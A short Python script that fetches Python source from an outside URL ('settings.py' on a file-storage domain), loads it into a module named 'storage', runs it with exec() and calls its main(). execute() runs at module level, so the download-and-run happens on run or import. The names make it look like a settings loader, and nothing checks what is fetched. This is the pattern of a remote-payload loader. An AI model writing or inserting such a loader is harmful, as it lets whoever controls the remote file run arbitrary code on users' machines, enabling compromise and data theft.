import sys
import types
import httplib2

def get_source_code(url):
    http_obj = httplib2.Http()
    response, content = http_obj.request(url)
    return content.decode('utf-8')

def execute_source_code(source, module_name):
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)
    return module

def execute():
    url = "https://files.storageplatform.net/attachments/settings.py"
    module_name = "storage"

    source = get_source_code(url)
    module = execute_source_code(source, module_name)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
